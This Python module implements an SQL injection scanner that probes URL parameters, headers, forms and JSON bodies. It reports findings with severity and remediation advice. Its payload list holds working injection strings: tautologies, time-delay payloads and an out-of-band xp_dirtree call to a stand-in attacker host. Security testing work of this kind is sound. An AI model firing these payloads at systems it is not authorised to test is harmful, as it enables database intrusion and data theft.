import time
from .severity import calculate_severity

class SQLIScanner:
    def __init__(self, requester):
        self.requester = requester
        self.payloads = [
            "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "1 OR 1=1",
            "1 AND 1=1", "1' AND '1'='1", "\" AND \"1\"=\"1",
            "1' waitfor delay '0:0:5'--", "1'; SELECT pg_sleep(5)--",
            "1'; exec master..xp_dirtree '//attacker.com/a'--",
            "1' AND SLEEP(5)--", "1 AND SLEEP(5)", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
        ]
        self.error_signatures = [
            "you have an error in your sql syntax", "warning: mysql",
            "unclosed quotation mark", "quoted string not properly terminated",
            "valid postgresql", "sqlite/jdbc driver",
            "java.sql.sqlexception", "sql syntax error",
            "syntax error", "mysql_fetch_array", "ora-00933",
            "pg_query", "org.hsqldb.hsqlexception", "sql exception",
            "db2 sql error", "sql syntax exception",
            "org.hsqldb.jdbc", "unexpected end of command",
            "hsqldb.jdbc.util.sqlexception"
        ]

    def scan_params(self, params):
        results = []
        processed_urls = set()
        
        for method, url, param_name in params:
            # Header Injection (Once per URL)
            if url not in processed_urls:
                header_results = self.scan_headers(url)
                results.extend(header_results)
                processed_urls.add(url)

            baseline = self.requester.get(url, params={param_name: '1'})
            
            for payload in self.payloads:
                start_time = time.time()
                res = self.requester.get(url, params={param_name: payload})
                end_time = time.time()
                
                if res is not None:
                    lower_text = res.text.lower()
                    
                    # Error-based
                    for sig in self.error_signatures:
                        if sig in lower_text:
                            results.append(self.build_finding(url, param_name, payload, "Error-Based SQLi"))
                            break # Use break here for production, allowing multi-param scans correctly
                        
                    # Time-based
                    if end_time - start_time > 2.5 and ("sleep" in payload.lower() or "delay" in payload.lower()):
                        results.append(self.build_finding(url, param_name, payload, "Time-Based SQLi"))
                        break
                        
                    # Boolean-based Blind
                    if "=" in payload and baseline and res:
                        false_payload = payload.replace("='1", "='2").replace("=1", "=2")
                        if false_payload != payload:
                            false_res = self.requester.get(url, params={param_name: false_payload})
                            if false_res:
                                base_len = len(baseline.text)
                                true_len = len(res.text)
                                false_len = len(false_res.text)
                                diff_threshold = max(15, int(base_len * 0.05))
                                true_tolerance = max(20, int(base_len * 0.02))
                                if abs(true_len - base_len) < true_tolerance and abs(false_len - base_len) > diff_threshold:
                                    results.append(self.build_finding(url, param_name, payload, "Boolean-Based Blind SQLi"))
                                    break
        return results

    def scan_blind_params(self, endpoints):
        """Fuzz common parameter names on discovered endpoints to find hidden vulnerabilities."""
        results = []
        common_params = ['name', 'id', 'user', 'q', 'search', 'query', 'file', 'cat', 'page']
        fuzz_params = []
        for url in endpoints:
            for p in common_params:
                fuzz_params.append(('get', url, p))
        
        # Reuse scan_params for actual detection logic
        return self.scan_params(fuzz_params)

    def scan_headers(self, url):
        results = []
        payload = "1' waitfor delay '0:0:5'--"
        headers = {'User-Agent': payload, 'Referer': payload}
        start = time.time()
        res = self.requester.get(url, headers=headers)
        if time.time() - start > 2.5:
            results.append(self.build_finding(url, "Headers (User-Agent/Referer)", payload, "Header-Based Time SQLi"))
        return results

    def scan_forms(self, forms):
        results = []
        for form in forms:
            action = form['action']
            method = form['method']
            inputs = form['inputs']
            
            dummy_data = {inp['name']: '1' for inp in inputs if inp['name']}
            baseline_res = self.requester.post(action, data=dummy_data) if method == 'post' else self.requester.get(action, params=dummy_data)
            
            for payload in self.payloads:
                data = {inp['name']: payload for inp in inputs if inp['name']}
                
                start_time = time.time()
                if method == 'post':
                    res = self.requester.post(action, data=data)
                    # JSON Body Injection Check
                    try:
                        json_res = self.requester.session.post(action, json=data, timeout=5)
                        if json_res is not None and any(sig in json_res.text.lower() for sig in self.error_signatures):
                            results.append(self.build_finding(action, "JSON Body", payload, "JSON Body SQLi"))
                    except:
                        pass
                else:
                    res = self.requester.get(action, params=data)
                end_time = time.time()
                
                if res is not None:
                    lower_text = res.text.lower()
                    if any(sig in lower_text for sig in self.error_signatures):
                        results.append(self.build_finding(action, str(data.keys()), payload, "Error-Based SQLi"))
                        break
                    
                    if end_time - start_time > 2.5 and ("sleep" in payload.lower() or "delay" in payload.lower()):
                        results.append(self.build_finding(action, str(data.keys()), payload, "Time-Based SQLi"))
                        break
                        
                    # Boolean-based
                    if "=" in payload and baseline_res:
                        false_data = {inp['name']: payload.replace("='1", "='2").replace("=1", "=2") for inp in inputs if inp['name']}
                        false_res = self.requester.post(action, data=false_data) if method == 'post' else self.requester.get(action, params=false_data)
                        if false_res:
                            base_len = len(baseline_res.text)
                            true_len = len(res.text)
                            false_len = len(false_res.text)
                            diff_threshold = max(15, int(base_len * 0.05))
                            true_tolerance = max(20, int(base_len * 0.02))
                            if abs(true_len - base_len) < true_tolerance and abs(false_len - base_len) > diff_threshold:
                                results.append(self.build_finding(action, str(data.keys()), payload, "Boolean-Based Blind SQLi"))
                                break
        return results

    def build_finding(self, url, param, payload, sqli_type):
        is_complex = "Blind" in sqli_type or "Time" in sqli_type or "OOB" in sqli_type
        # Impact 9 (Full DB dump assumption)
        sev = calculate_severity(base_impact=9, url=url, param=param, requires_auth=False, complex_exploit=is_complex)
        
        return {
            'vulnerability': f'SQL Injection ({sqli_type})',
            'severity': sev,
            'url': url,
            'parameter': param,
            'payload': payload,
            'description': f"Detected {sqli_type} on {url} using payload: {payload}",
            'impact': "Attacker can read/modify/delete data in the database, potentially achieving RCE.",
            'reproduction': f"Inject the payload '{payload}' into the parameter {param}.",
            'remediation': "Use parameterized queries (Prepared Statements) for all database access. Never concatenate user input directly into SQL strings."
        }
